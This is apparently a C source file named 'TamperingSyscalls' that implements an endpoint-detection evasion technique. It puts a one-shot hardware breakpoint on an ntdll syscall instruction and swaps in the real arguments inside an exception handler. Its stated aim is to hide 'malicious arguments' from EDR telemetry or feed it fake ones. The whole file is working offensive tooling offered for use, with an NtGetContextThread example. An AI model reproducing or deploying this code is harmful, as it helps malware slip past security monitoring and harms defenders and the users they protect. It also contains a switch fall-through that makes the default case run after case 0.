/*++
TamperingSyscalls
- rad98

We set a HWBP on syscall address, remove the HWBP, fix the arguments, and make the call
Thus avoiding reveal our malicious arguments to the EDR telemetry.

(possibility for you to include your own fake arguments to feed EDR the wrong telemetry. 
Maybe I will write a blog post on this)

We need to setup the states (what we want to fix the arguments to) and then make the right 
corresponding calls. I have provided one example with NtGetContextThread. 
--*/
#include <Windows.h>
#include <winternl.h>

#pragma region macros
#define _DEBUG 1

#if _DEBUG == 0
#define PRINT( STR, ... )
#else
#define PRINT( STR, ... )                                                                   \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );			\
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  
#endif

#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )
#pragma endregion

// Can't do it for NtResumeThread or NtSetEvent as these are used after the hardware breakpoint is set.

// Need to make a struct with the arguments.
typedef struct {
	HANDLE			ThreadHandle;
	PCONTEXT		pContext;
} NtGetContextThread;

typedef struct {
	int		index;
	LPVOID	arguments;
} STATE;

// Need to make a global variable of our struct (which we fix the arguments in the handler)
NtGetContextThread pNtGetThreadContext;


// Need to setup states in order you call the functions.
STATE StateArray[] = {
	{ 0 , &pNtGetThreadContext},
};

DWORD StatePointer = 0;

LONG WINAPI OneShotHardwareBreakpointHandler( PEXCEPTION_POINTERS ExceptionInfo );

LPVOID FindSyscallAddress( LPVOID function );

VOID SetOneshotHardwareBreakpoint( LPVOID address );

NTSTATUS SpoofSyscaller( PVOID FunctionAddress )
{
	typedef NTSTATUS( WINAPI* typeReturn )();

	SetOneshotHardwareBreakpoint( FindSyscallAddress( FunctionAddress ) );

	typeReturn ReturnNtStatus = (typeReturn)FunctionAddress;
	NTSTATUS status = ReturnNtStatus();

	return status;
}


int main()
{
	SetUnhandledExceptionFilter( OneShotHardwareBreakpointHandler );

	// We populate our global structure of our function arguments.
	CONTEXT Context;
	pNtGetThreadContext.pContext = &Context;
	pNtGetThreadContext.ThreadHandle = OpenThread( THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId() );

	// You can use API Hashing or something else. It wasn't exclusive to this project so I didn't
	// include it.
	LPVOID FunctionAddress = GetProcAddress( GetModuleHandleA( "NTDLL.dll" ), "NtGetContextThread" );
	
	NTSTATUS status = SpoofSyscaller( FunctionAddress );
	if( NT_SUCCESS( status ) ) {
		PRINT( "Success : %x\n", status );
	}
	else {
		PRINT( "Error : %x\n", status );
	}

	return 0;
}


LONG WINAPI OneShotHardwareBreakpointHandler( PEXCEPTION_POINTERS ExceptionInfo )
{
	if( ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP )
	{
		if( ExceptionInfo->ContextRecord->Dr7 & 1 ) {
			// if the ExceptionInfo->ContextRecord->Rip == ExceptionInfo->ContextRecord->Dr0 
			// then we are at the one shot breakpoint address
			// ExceptionInfo->ContextRecord->Rax should hold the syscall number
			PRINT( "Syscall : 0x%x\n", ExceptionInfo->ContextRecord->Rax );
			if( ExceptionInfo->ContextRecord->Rip == ExceptionInfo->ContextRecord->Dr0 ) {
				ExceptionInfo->ContextRecord->Dr0 = 0;

				// You need to fix your arguments in the right registers and stack here.
				switch( StatePointer ) {
				case 0:
					ExceptionInfo->ContextRecord->Rcx =
						(DWORD_PTR)((NtGetContextThread*)(StateArray[StatePointer].arguments))->ThreadHandle;
					ExceptionInfo->ContextRecord->Rdx =
						(DWORD_PTR)((NtGetContextThread*)(StateArray[StatePointer].arguments))->pContext;
					// put your other states here.


				// you have messed up by not providing the indexed state
				default:
					ExceptionInfo->ContextRecord->Rip++;
					return EXCEPTION_CONTINUE_EXECUTION;
				}
				StatePointer += 1;
				return EXCEPTION_CONTINUE_EXECUTION;
			}
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

typedef struct {
	HANDLE		hThread;
	HANDLE		hSynvnt;
	LPVOID		address;
} ONE_SHOT;

DWORD WINAPI RegisterDebug( LPVOID lpParameter )
{
	ONE_SHOT* OneShot = (ONE_SHOT*)lpParameter;

	if( !SuspendThread( OneShot->hThread ) ) {
		
		CONTEXT context = { 0 };
		context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
		if( GetThreadContext( OneShot->hThread, &context ) )
		{

			context.Dr0 = (DWORD64)OneShot->address;
			context.Dr6 = 0;
			context.Dr7 = (context.Dr7 & ~(((1 << 2) - 1) << 16)) | (0 << 16);
			context.Dr7 = (context.Dr7 & ~(((1 << 2) - 1) << 18)) | (0 << 18);
			context.Dr7 = (context.Dr7 & ~(((1 << 1) - 1) << 0)) | (1 << 0);

			context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
			SetThreadContext( OneShot->hThread, &context );
		}
		ResumeThread( OneShot->hThread );
	}
	
	SetEvent( OneShot->hSynvnt );

	return 0;
}

VOID SetOneshotHardwareBreakpoint( LPVOID address )
{
	ONE_SHOT* OneShot = 
		(ONE_SHOT*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( ONE_SHOT ) );
	
	OneShot->address = address;
	OneShot->hSynvnt = CreateEvent( 0, 0, 0, 0 );
	OneShot->hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId() );

	HANDLE hThread = CreateThread( 0, 0, RegisterDebug, (LPVOID)OneShot, 0, 0 );
	
	WaitForSingleObject( OneShot->hSynvnt, INFINITE );
	
	CloseHandle( OneShot->hSynvnt );
	CloseHandle( OneShot->hThread );
	CloseHandle( hThread );

	HeapFree( GetProcessHeap(), 0, OneShot);

	return;
}

/// + 0x12 generally 
LPVOID FindSyscallAddress( LPVOID function )
{
	BYTE stub[] = { 0x0F, 0x05 };
	for( unsigned int i = 0; i < (unsigned int)25; i++ )
	{
		if( memcmp( (LPVOID)((DWORD_PTR)function + i), stub, 2 ) == 0 ) {
			return (LPVOID)((DWORD_PTR)function + i);
		}
	}
	return NULL;
}